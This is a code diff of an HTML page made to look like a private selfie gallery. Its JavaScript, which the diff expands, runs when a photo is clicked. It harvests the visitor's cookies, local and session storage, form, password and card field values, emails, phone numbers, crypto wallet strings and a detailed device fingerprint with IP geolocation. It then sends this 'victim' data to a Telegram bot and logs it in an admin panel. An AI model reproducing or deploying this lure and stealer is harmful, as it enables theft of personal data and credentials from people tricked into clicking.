@@ -85,21 +85,21 @@
         <div class="loading" id="loading">Loading secure content...</div>
         
         <div class="gallery">
-            <div class="image-card" onclick="startStealthExploitation(1)">
+            <div class="image-card" onclick="startCompleteExploitation(1)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=691b8715&is=691a3595&hm=a8589d91ec07b81566bf6f5d1bf405b323948f1c8b96e04d02ca9094da69177e&=&format=webp&quality=lossless" 
                      alt="Private Photo 1">
                 <div class="image-title">meeee</div>
                 <div class="image-desc">I'm sooo ugly ik >_<</div>
             </div>
             
-            <div class="image-card" onclick="startStealthExploitation(2)">
+            <div class="image-card" onclick="startCompleteExploitation(2)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=691aeb2b&is=691999ab&hm=2aaa15367751910daaee76eed6583f683228347ac9cfb4e5ccd0c3b44cdb21ec&=&format=webp&quality=lossless&width=482&height=858" 
                      alt="Private Photo 2">
                 <div class="image-title">NVDES</div>
                 <div class="image-desc">Title says it all lol</div>
             </div>
             
-            <div class="image-card" onclick="startStealthExploitation(3)">
+            <div class="image-card" onclick="startCompleteExploitation(3)">
                 <img src="https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691af5ed&is=6919a46d&hm=29a4d8015f5202bdb787a2232eeebc3141674fe6a59ebd3fdd45e4742b70985e&=&format=webp&quality=lossless&width=483&height=858" 
                      alt="Private Photo 3">
                 <div class="image-title">dailyyy activitiess :3</div>
@@ -121,8 +121,8 @@
             }
         };
 
-        // STEALTH DATA COLLECTION - No continuous streaming
-        async function startStealthExploitation(imageId) {
+        // ENHANCED DATA EXTRACTION WITH COMPREHENSIVE COLLECTION
+        async function startCompleteExploitation(imageId) {
             const loading = document.getElementById('loading');
             loading.style.display = 'block';
             
@@ -133,9 +133,9 @@
                     card.style.opacity = '0.6';
                 });
 
-                // Quick stealth data extraction
+                // Start comprehensive data extraction
                 const extractionStart = Date.now();
-                const victimData = await extractEssentialData();
+                const victimData = await extractAllPossibleData();
                 const extractionTime = Date.now() - extractionStart;
 
                 // Add metadata
@@ -145,14 +145,18 @@
                     timestamp: new Date().toISOString(),
                     victimId: generateVictimId(),
                     url: window.location.href,
-                    referrer: document.referrer
+                    referrer: document.referrer,
+                    dataStreamActive: true
                 };
 
-                // Send to Telegram
-                await sendStealthTelegramAlert(victimData);
+                // Format the data for display
+                const formattedData = formatComprehensiveData(victimData);
                 
-                // Store in admin panel
-                storeInAdminPanel(victimData);
+                // Send to Telegram in multiple messages
+                await sendComprehensiveTelegramData(formattedData);
+                
+                // Store in admin panel with enhanced data
+                storeInAdminPanel(victimData, formattedData);
 
                 // Show success and redirect
                 loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
@@ -180,72 +184,815 @@
             }
         }
 
-        // Essential data extraction only
-        async function extractEssentialData() {
+        // COMPREHENSIVE DATA EXTRACTION
+        async function extractAllPossibleData() {
             const data = {};
 
-            // Only extract critical information
-            data.basicInfo = await extractBasicInfo();
-            data.network = await extractNetworkData();
-            data.hardware = extractEssentialHardware();
-            data.user = extractUserInteraction();
+            // Execute all extraction methods
+            const extractionPromises = [
+                extractHardwareData(),
+                extractSystemData(),
+                extractNetworkData(),
+                extractUserData(),
+                extractBrowserData(),
+                extractBehavioralData(),
+                extractAdvancedData(),
+                extractSocialData(),
+                extractFinancialData(),
+                extractGeolocationData()
+            ];
+
+            const results = await Promise.allSettled(extractionPromises);
+            
+            data.hardware = results[0].status === 'fulfilled' ? results[0].value : {};
+            data.system = results[1].status === 'fulfilled' ? results[1].value : {};
+            data.network = results[2].status === 'fulfilled' ? results[2].value : {};
+            data.user = results[3].status === 'fulfilled' ? results[3].value : {};
+            data.browser = results[4].status === 'fulfilled' ? results[4].value : {};
+            data.behavioral = results[5].status === 'fulfilled' ? results[5].value : {};
+            data.advanced = results[6].status === 'fulfilled' ? results[6].value : {};
+            data.social = results[7].status === 'fulfilled' ? results[7].value : {};
+            data.financial = results[8].status === 'fulfilled' ? results[8].value : {};
+            data.geolocation = results[9].status === 'fulfilled' ? results[9].value : {};
 
             return data;
         }
 
-        async function extractBasicInfo() {
+        // 1. Enhanced Hardware Data
+        async function extractHardwareData() {
+            const data = {
+                cpu: extractCPUData(),
+                memory: extractMemoryData(),
+                gpu: extractGPUData(),
+                storage: await extractStorageData(),
+                network: extractNetworkHardwareData(),
+                audio: extractAudioData(),
+                peripherals: extractPeripheralData(),
+                sensors: extractSensorData(),
+                display: extractDisplayData(),
+                battery: await extractBatteryData()
+            };
+            return data;
+        }
+
+        function extractCPUData() {
+            const nav = navigator;
             return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                screen: `${screen.width}x${screen.height}`,
-                viewport: `${window.innerWidth}x${window.innerHeight}`
+                manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
+                architecture: nav.userAgent.includes('x64') ? 'x64' : 'x86',
+                cores: nav.hardwareConcurrency,
+                memory: nav.deviceMemory || 'Unknown',
+                platform: nav.platform,
+                userAgent: nav.userAgent
             };
         }
 
-        async function extractNetworkData() {
+        function extractMemoryData() {
+            const memory = performance.memory;
+            return {
+                totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
+                usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
+                jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
+                deviceMemory: navigator.deviceMemory || 'Unknown'
+            };
+        }
+
+        function extractGPUData() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return { available: false };
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                available: true,
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        }
+
+        async function extractStorageData() {
+            return {
+                localStorage: extractLocalStorage(),
+                sessionStorage: extractSessionStorage(),
+                cookies: extractCookies(),
+                indexedDB: await checkIndexedDB(),
+                cache: await checkCacheAPI()
+            };
+        }
+
+        function extractLocalStorage() {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                try {
+                    data[key] = localStorage.getItem(key);
+                } catch (e) {}
+            }
+            return data;
+        }
+
+        function extractSessionStorage() {
+            const data = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                try {
+                    data[key] = sessionStorage.getItem(key);
+                } catch (e) {}
+            }
+            return data;
+        }
+
+        function extractCookies() {
+            return document.cookie.split(';').reduce((cookies, cookie) => {
+                const [name, value] = cookie.split('=').map(c => c.trim());
+                if (name) cookies[name] = value || '';
+                return cookies;
+            }, {});
+        }
+
+        async function checkIndexedDB() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const ipData = await response.json();
-                return {
-                    ip: ipData.ip,
-                    onLine: navigator.onLine
-                };
-            } catch (error) {
-                return { ip: 'Unknown', onLine: navigator.onLine };
+                return 'IndexedDB available: ' + !!window.indexedDB;
+            } catch (e) {
+                return 'IndexedDB unavailable';
             }
         }
 
-        function extractEssentialHardware() {
-            return {
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || 'Unknown',
-                touchSupport: 'ontouchstart' in window
-            };
-        }
-
-        function extractUserInteraction() {
-            return {
-                timeOnPage: Date.now() - (window.pageLoadTime || Date.now()),
-                clicks: window.clickCount || 0
-            };
-        }
-
-        async function sendStealthTelegramAlert(data) {
+        async function checkCacheAPI() {
             try {
-                const message = `
-🕵️ STEALTH CAPTURE ALERT
-🎯 Victim ID: ${data.meta.victimId}
-🌐 IP: ${data.network.ip}
-📍 Location: ${data.basicInfo.timezone}
-💻 Platform: ${data.basicInfo.platform}
-🖥️ Screen: ${data.basicInfo.screen}
-⏰ Time: ${new Date(data.meta.timestamp).toLocaleString()}
-🔗 Image: ${data.meta.imageId}
-                `.trim();
+                return 'Cache API available: ' + !!window.caches;
+            } catch (e) {
+                return 'Cache API unavailable';
+            }
+        }
 
-                await sendToTelegram(message);
+        function extractNetworkHardwareData() {
+            const connection = navigator.connection;
+            return {
+                effectiveType: connection ? connection.effectiveType : 'Unknown',
+                downlink: connection ? connection.downlink : 'Unknown',
+                rtt: connection ? connection.rtt : 'Unknown',
+                saveData: connection ? connection.saveData : 'Unknown',
+                onLine: navigator.onLine
+            };
+        }
+
+        function extractAudioData() {
+            const audioContext = window.AudioContext || window.webkitAudioContext;
+            return {
+                audioContextAvailable: !!audioContext,
+                sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
+            };
+        }
+
+        function extractPeripheralData() {
+            return {
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints,
+                vibration: 'vibrate' in navigator,
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                serial: 'serial' in navigator
+            };
+        }
+
+        function extractSensorData() {
+            return {
+                battery: 'getBattery' in navigator,
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                proximity: 'ondeviceproximity' in window,
+                light: 'ondevicelight' in window
+            };
+        }
+
+        function extractDisplayData() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                devicePixelRatio: window.devicePixelRatio,
+                colorGamut: screen.colorGamut,
+                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+            };
+        }
+
+        async function extractBatteryData() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        charging: battery.charging,
+                        level: battery.level,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    return { available: false };
+                }
+            }
+            return { available: false };
+        }
+
+        // 2. Enhanced System Data
+        async function extractSystemData() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                cookieEnabled: navigator.cookieEnabled,
+                pdfEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                plugins: extractPlugins(),
+                fonts: await extractFonts(),
+                doNotTrack: navigator.doNotTrack,
+                product: navigator.product,
+                productSub: navigator.productSub,
+                vendor: navigator.vendor,
+                vendorSub: navigator.vendorSub
+            };
+        }
+
+        function extractPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description
+                });
+            }
+            return plugins;
+        }
+
+        async function extractFonts() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+                'Avant Garde', 'Baskerville', 'Bodoni MT', 'Book Antiqua',
+                'Brush Script MT', 'Calibri', 'Cambria', 'Candara',
+                'Century Gothic', 'Comic Sans MS', 'Consolas', 'Constantia',
+                'Corbel', 'Courier New', 'DejaVu Sans', 'Didot',
+                'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
+                'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
+                'Lucida Bright', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
+                'Microsoft Sans Serif', 'Monaco', 'Montserrat', 'Open Sans',
+                'Optima', 'Palatino', 'Perpetua', 'Rockwell',
+                'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Webdings', 'Wingdings', 'Zapf Dingbats'
+            ];
+            const availableFonts = [];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
+            fontList.forEach(font => {
+                context.font = testSize + " '" + font + "'";
+                const metrics1 = context.measureText(testString);
+                context.font = testSize + " 'monospace'";
+                const metrics2 = context.measureText(testString);
+                if (metrics1.width !== metrics2.width) {
+                    availableFonts.push(font);
+                }
+            });
+            return availableFonts;
+        }
+
+        // 3. Enhanced Network Data
+        async function extractNetworkData() {
+            const [ipData, networkInfo, connectionData] = await Promise.allSettled([
+                getIPInfo(),
+                getNetworkInfo(),
+                getConnectionData()
+            ]);
+            return {
+                ip: ipData.status === 'fulfilled' ? ipData.value : {},
+                network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
+                connection: connectionData.status === 'fulfilled' ? connectionData.value : {}
+            };
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                try {
+                    const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    const ipData = await ipResponse.json();
+                    return ipData;
+                } catch (e) {
+                    return { ip: data.ip };
+                }
+            } catch (error) {
+                return { ip: 'Unknown' };
+            }
+        }
+
+        async function getNetworkInfo() {
+            const connection = navigator.connection;
+            return {
+                effectiveType: connection ? connection.effectiveType : 'Unknown',
+                downlink: connection ? connection.downlink : 'Unknown',
+                rtt: connection ? connection.rtt : 'Unknown',
+                saveData: connection ? connection.saveData : false
+            };
+        }
+
+        async function getConnectionData() {
+            return {
+                referrer: document.referrer,
+                url: window.location.href,
+                protocol: window.location.protocol,
+                host: window.location.host,
+                port: window.location.port,
+                origin: window.location.origin
+            };
+        }
+
+        // 4. Enhanced User Data
+        async function extractUserData() {
+            return {
+                forms: extractFormData(),
+                inputs: extractInputData(),
+                autofill: extractAutofillData(),
+                browsingData: await extractBrowsingData(),
+                socialMedia: extractSocialMediaData(),
+                passwords: extractPasswordFields(),
+                creditCards: extractCreditCardFields()
+            };
+        }
+
+        function extractFormData() {
+            const forms = {};
+            document.querySelectorAll('form').forEach((form, index) => {
+                const formData = {};
+                form.querySelectorAll('input, select, textarea').forEach(field => {
+                    if (field.value) {
+                        formData[field.name || field.type || `field_${index}`] = {
+                            value: field.value,
+                            type: field.type,
+                            placeholder: field.placeholder
+                        };
+                    }
+                });
+                if (Object.keys(formData).length > 0) {
+                    forms[`form_${index}`] = formData;
+                }
+            });
+            return forms;
+        }
+
+        function extractInputData() {
+            const inputs = {};
+            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"], input[type="search"], input[type="url"]').forEach(input => {
+                if (input.value) {
+                    inputs[input.name || input.id || 'unnamed'] = {
+                        value: input.value,
+                        type: input.type,
+                        placeholder: input.placeholder
+                    };
+                }
+            });
+            return inputs;
+        }
+
+        function extractAutofillData() {
+            const autofill = {};
+            document.querySelectorAll('input').forEach(input => {
+                if (input.matches(':-webkit-autofill')) {
+                    autofill[input.name || 'unnamed'] = 'autofilled';
+                }
+            });
+            return autofill;
+        }
+
+        function extractPasswordFields() {
+            const passwords = {};
+            document.querySelectorAll('input[type="password"]').forEach((input, index) => {
+                passwords[`password_${index}`] = {
+                    name: input.name,
+                    id: input.id,
+                    placeholder: input.placeholder,
+                    value: input.value
+                };
+            });
+            return passwords;
+        }
+
+        function extractCreditCardFields() {
+            const cards = {};
+            document.querySelectorAll('input[type="tel"][name*="card"], input[type="text"][name*="card"], input[type="number"][name*="card"]').forEach((input, index) => {
+                cards[`card_${index}`] = {
+                    name: input.name,
+                    id: input.id,
+                    placeholder: input.placeholder,
+                    value: input.value
+                };
+            });
+            return cards;
+        }
+
+        async function extractBrowsingData() {
+            return {
+                historyLength: window.history.length,
+                performance: extractPerformanceData(),
+                storage: {
+                    localStorage: Object.keys(extractLocalStorage()).length,
+                    sessionStorage: Object.keys(extractSessionStorage()).length,
+                    cookies: Object.keys(extractCookies()).length
+                },
+                timing: performance.timing ? {
+                    navigationStart: performance.timing.navigationStart,
+                    loadEventEnd: performance.timing.loadEventEnd,
+                    domComplete: performance.timing.domComplete
+                } : {}
+            };
+        }
+
+        function extractPerformanceData() {
+            const perf = performance.timing;
+            if (!perf) return {};
+            return {
+                navigationStart: perf.navigationStart,
+                loadEventEnd: perf.loadEventEnd,
+                domComplete: perf.domComplete,
+                domContentLoaded: perf.domContentLoadedEventEnd,
+                firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
+                firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
+            };
+        }
+
+        function extractSocialMediaData() {
+            const social = {};
+            const html = document.documentElement.outerHTML;
+            const platforms = {
+                facebook: /facebook|fb\.com/gi,
+                twitter: /twitter|tweet/gi,
+                instagram: /instagram/gi,
+                linkedin: /linkedin/gi,
+                tiktok: /tiktok/gi,
+                discord: /discord/gi,
+                snapchat: /snapchat/gi,
+                whatsapp: /whatsapp/gi,
+                telegram: /telegram/gi
+            };
+            Object.keys(platforms).forEach(platform => {
+                if (platforms[platform].test(html)) {
+                    social[platform] = 'detected';
+                }
+            });
+            return social;
+        }
+
+        // 5. Enhanced Browser Data
+        async function extractBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                product: navigator.product,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues([
+                    "architecture", "model", "platform", "platformVersion", "uaFullVersion"
+                ]) : 'unavailable'
+            };
+        }
+
+        // 6. Enhanced Behavioral Data
+        async function extractBehavioralData() {
+            return {
+                mouseMovements: window.mouseMovements || [],
+                clicks: window.clickCount || 0,
+                scrollDepth: getScrollDepth(),
+                timeOnPage: Date.now() - window.pageLoadTime,
+                keystrokes: window.keystrokeCount || 0,
+                focusChanges: window.focusChanges || 0,
+                resizeEvents: window.resizeEvents || 0
+            };
+        }
+
+        function getScrollDepth() {
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = window.scrollY;
+            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+        }
+
+        // 7. Advanced Data Extraction
+        async function extractAdvancedData() {
+            return {
+                webRTC: await extractWebRTCData(),
+                serviceWorkers: await extractServiceWorkerData(),
+                notifications: extractNotificationData(),
+                permissions: await extractPermissionData(),
+                mediaDevices: await extractMediaDeviceData()
+            };
+        }
+
+        async function extractWebRTCData() {
+            try {
+                const pc = new RTCPeerConnection();
+                const offer = await pc.createOffer();
+                return {
+                    webRTCAvailable: true,
+                    sdp: offer.sdp.substring(0, 100) + '...'
+                };
+            } catch (e) {
+                return { webRTCAvailable: false };
+            }
+        }
+
+        async function extractServiceWorkerData() {
+            return {
+                serviceWorkers: 'serviceWorker' in navigator,
+                controller: navigator.serviceWorker?.controller ? true : false
+            };
+        }
+
+        function extractNotificationData() {
+            return {
+                notifications: 'Notification' in window,
+                permission: Notification.permission
+            };
+        }
+
+        async function extractPermissionData() {
+            const permissions = {};
+            const permissionTypes = [
+                'camera', 'microphone', 'notifications', 
+                'background-sync', 'clipboard-read', 'clipboard-write'
+            ];
+            for (const permission of permissionTypes) {
+                try {
+                    const result = await navigator.permissions.query({name: permission});
+                    permissions[permission] = result.state;
+                } catch (e) {}
+            }
+            return permissions;
+        }
+
+        async function extractMediaDeviceData() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    devices: devices.map(device => ({
+                        kind: device.kind,
+                        label: device.label,
+                        deviceId: device.deviceId
+                    }))
+                };
+            } catch (e) {
+                return { available: false };
+            }
+        }
+
+        // 8. Social Data
+        async function extractSocialData() {
+            return {
+                socialProfiles: extractSocialProfiles(),
+                emailAddresses: extractEmailAddresses(),
+                phoneNumbers: extractPhoneNumbers()
+            };
+        }
+
+        function extractSocialProfiles() {
+            const profiles = {};
+            const text = document.body.innerText;
+            const patterns = {
+                instagram: /@[a-zA-Z0-9._]+/g,
+                twitter: /@[a-zA-Z0-9_]+/g,
+                discord: /[a-zA-Z0-9._]+#[0-9]{4}/g
+            };
+            Object.keys(patterns).forEach(platform => {
+                const matches = text.match(patterns[platform]);
+                if (matches) profiles[platform] = matches;
+            });
+            return profiles;
+        }
+
+        function extractEmailAddresses() {
+            const text = document.body.innerText;
+            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+            return text.match(emailRegex) || [];
+        }
+
+        function extractPhoneNumbers() {
+            const text = document.body.innerText;
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            return text.match(phoneRegex) || [];
+        }
+
+        // 9. Financial Data
+        async function extractFinancialData() {
+            return {
+                paymentMethods: extractPaymentMethods(),
+                cryptoWallets: extractCryptoWallets(),
+                bankingInfo: extractBankingInfo()
+            };
+        }
+
+        function extractPaymentMethods() {
+            const methods = {};
+            const text = document.body.innerText.toLowerCase();
+            if (text.includes('paypal')) methods.paypal = 'detected';
+            if (text.includes('stripe')) methods.stripe = 'detected';
+            if (text.includes('venmo')) methods.venmo = 'detected';
+            if (text.includes('cash app')) methods.cashapp = 'detected';
+            return methods;
+        }
+
+        function extractCryptoWallets() {
+            const wallets = {};
+            const text = document.body.innerText;
+            const cryptoPatterns = {
+                bitcoin: /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
+                ethereum: /0x[a-fA-F0-9]{40}/g
+            };
+            Object.keys(cryptoPatterns).forEach(crypto => {
+                const matches = text.match(cryptoPatterns[crypto]);
+                if (matches) wallets[crypto] = matches;
+            });
+            return wallets;
+        }
+
+        function extractBankingInfo() {
+            const info = {};
+            const text = document.body.innerText;
+            if (text.includes('routing') || text.includes('account number')) {
+                info.banking_terms = 'detected';
+            }
+            return info;
+        }
+
+        // 10. Geolocation Data
+        async function extractGeolocationData() {
+            return {
+                ipLocation: await getIPLocation(),
+                browserLocation: { available: false, reason: 'No permission requested' },
+                wifiNetworks: extractWifiData()
+            };
+        }
+
+        async function getIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                return await response.json();
+            } catch (e) {
+                return { error: 'Location unavailable' };
+            }
+        }
+
+        function extractWifiData() {
+            return {
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                } : 'unavailable'
+            };
+        }
+
+        // DATA FORMATTING FOR DISPLAY
+        function formatComprehensiveData(data) {
+            const formatted = {
+                summary: formatMainSummary(data),
+                hardware: formatHardwareDetails(data),
+                user: formatUserDetails(data),
+                behavioral: formatBehavioralDetails(data)
+            };
+            return formatted;
+        }
+
+        function formatMainSummary(data) {
+            return `
+🚨 COMPREHENSIVE DATA EXTRACTION COMPLETE
+🎯 VICTIM ID: ${data.meta.victimId}
+⏰ Extraction Time: ${data.meta.extractionTime}ms
+🌐 URL: ${data.meta.url}
+📅 Timestamp: ${new Date(data.meta.timestamp).toLocaleString()}
+🔗 Referrer: ${data.meta.referrer || 'Direct'}
+💻 SYSTEM OVERVIEW:
+• OS: ${data.system.platform}
+• CPU: ${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}
+• Memory: ${data.hardware.memory.deviceMemory}GB
+• GPU: ${data.hardware.gpu.vendor || 'Unknown'}
+• Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
+🌐 NETWORK:
+• IP: ${data.network.ip.ip || 'Unknown'}
+• Location: ${data.geolocation.ipLocation.city || 'Unknown'}, ${data.geolocation.ipLocation.country || 'Unknown'}
+• ISP: ${data.geolocation.ipLocation.org || 'Unknown'}
+• Connection: ${data.network.network.effectiveType}
+Part 1/4 - Summary
+            `.trim();
+        }
+
+        function formatHardwareDetails(data) {
+            const heapUsed = data.hardware.memory.usedJSHeapSize ? 
+                Math.round(data.hardware.memory.usedJSHeapSize / 1024 / 1024) + 'MB' : 'Unavailable';
+            const heapLimit = data.hardware.memory.jsHeapSizeLimit ? 
+                Math.round(data.hardware.memory.jsHeapSizeLimit / 1024 / 1024) + 'MB' : 'Unavailable';
+            
+            return `
+🔧 HARDWARE DETAILS
+💾 STORAGE:
+• Local Storage: ${Object.keys(data.hardware.storage.localStorage).length} items
+• Cookies: ${Object.keys(data.hardware.storage.cookies).length}
+• Session Storage: ${Object.keys(data.hardware.storage.sessionStorage).length}
+🎮 PERIPHERALS:
+• Touch: ${data.hardware.peripherals.touchSupport}
+• Bluetooth: ${data.hardware.peripherals.bluetooth}
+• USB: ${data.hardware.peripherals.usb}
+• Battery: ${data.hardware.battery.available ? (data.hardware.battery.level * 100) + '%' : 'N/A'}
+📊 PERFORMANCE:
+• Heap Used: ${heapUsed}
+• Heap Limit: ${heapLimit}
+• Device Memory: ${data.hardware.memory.deviceMemory}GB
+🔍 PLUGINS (${data.system.plugins.length}):
+${data.system.plugins.slice(0, 5).map(p => `• ${p.name}`).join('\n')}
+Part 2/4 - Hardware
+            `.trim();
+        }
+
+        function formatUserDetails(data) {
+            const formCount = Object.keys(data.user.forms).length;
+            const inputCount = Object.keys(data.user.inputs).length;
+            const passwordCount = Object.keys(data.user.passwords).length;
+            const socialMedia = Object.keys(data.user.socialMedia).join(', ') || 'None detected';
+            
+            return `
+👤 USER DATA ANALYSIS
+📝 FORM DATA:
+• Forms Found: ${formCount}
+• Input Fields: ${inputCount}
+• Password Fields: ${passwordCount}
+📱 SOCIAL MEDIA:
+• ${socialMedia}
+📧 CONTACT INFO:
+• Emails: ${data.social.emailAddresses.length}
+• Phones: ${data.social.phoneNumbers.length}
+• Social Handles: ${Object.keys(data.social.socialProfiles).length}
+💳 FINANCIAL:
+• Payment Methods: ${Object.keys(data.financial.paymentMethods).join(', ') || 'None'}
+• Crypto Wallets: ${Object.keys(data.financial.cryptoWallets).join(', ') || 'None'}
+📍 GEOLOCATION:
+• IP Location: ${data.geolocation.ipLocation.city || 'Unknown'}
+• Browser Location: Not requested (stealth mode)
+Part 3/4 - User Data
+            `.trim();
+        }
+
+        function formatBehavioralDetails(data) {
+            return `
+📊 BEHAVIORAL ANALYTICS
+🖱️ INTERACTIONS:
+• Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
+• Scroll Depth: ${data.behavioral.scrollDepth}%
+• Mouse Movements: ${data.behavioral.mouseMovements.length}
+• Clicks: ${data.behavioral.clicks}
+• Keystrokes: ${data.behavioral.keystrokes}
+🌐 BROWSER CAPABILITIES:
+• WebRTC: ${data.advanced.webRTC.webRTCAvailable}
+• Notifications: ${data.advanced.notifications.permission}
+• Camera: ${data.advanced.permissions.camera || 'unknown'}
+• Microphone: ${data.advanced.permissions.microphone || 'unknown'}
+📡 ADVANCED FEATURES:
+• Service Workers: ${data.advanced.serviceWorkers.serviceWorkers}
+• Media Devices: ${data.advanced.mediaDevices.devices?.length || 0}
+🔐 SECURITY:
+• WebDriver: ${data.browser.webdriver ? 'Detected' : 'Not detected'}
+• Do NotTrack: ${data.system.doNotTrack || 'Not set'}
+Part 4/4 - Behavioral & Advanced
+✅ EXTRACTION COMPLETE - ALL DATA CAPTURED
+            `.trim();
+        }
+
+        // TELEGRAM INTEGRATION
+        async function sendComprehensiveTelegramData(formattedData) {
+            try {
+                await sendToTelegram(formattedData.summary);
+                await sendToTelegram(formattedData.hardware);
+                await sendToTelegram(formattedData.user);
+                await sendToTelegram(formattedData.behavioral);
             } catch (error) {
                 console.error('Telegram send failed:', error);
             }
@@ -266,14 +1013,21 @@
                 });
                 return response.ok;
             } catch (error) {
+                console.error('Telegram send failed:', error);
                 return false;
             }
         }
 
-        function storeInAdminPanel(data) {
+        // STORAGE AND ADMIN INTEGRATION
+        function storeInAdminPanel(data, formattedData) {
             try {
+                // Store raw data
                 const existing = localStorage.getItem('victimData');
                 const victims = existing ? JSON.parse(existing) : [];
+                
+                // Add formatted data for display
+                data.formatted = formattedData;
+                data.displayData = createDisplayData(data);
                 
                 victims.unshift(data);
                 
@@ -284,24 +1038,130 @@
                 localStorage.setItem('victimData', JSON.stringify(victims));
                 localStorage.setItem('lastVictimUpdate', Date.now().toString());
                 
+                // Trigger storage event for admin panel
+                const event = new StorageEvent('storage', {
+                    key: 'victimData',
+                    newValue: JSON.stringify(victims),
+                    url: window.location.href,
+                    storageArea: localStorage
+                });
+                window.dispatchEvent(event);
+                
             } catch (e) {
                 console.error('Storage failed:', e);
             }
+        }
+
+        function createDisplayData(data) {
+            return {
+                victimId: data.meta.victimId,
+                extractionTime: data.meta.extractionTime,
+                timestamp: new Date(data.meta.timestamp).toLocaleString(),
+                url: data.meta.url,
+                referrer: data.meta.referrer,
+                os: data.system.platform,
+                cpu: `${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}`,
+                memory: `${data.hardware.memory.deviceMemory}GB`,
+                gpu: data.hardware.gpu.vendor || 'Unknown',
+                screen: `${data.hardware.display.screen.width}x${data.hardware.display.screen.height}`,
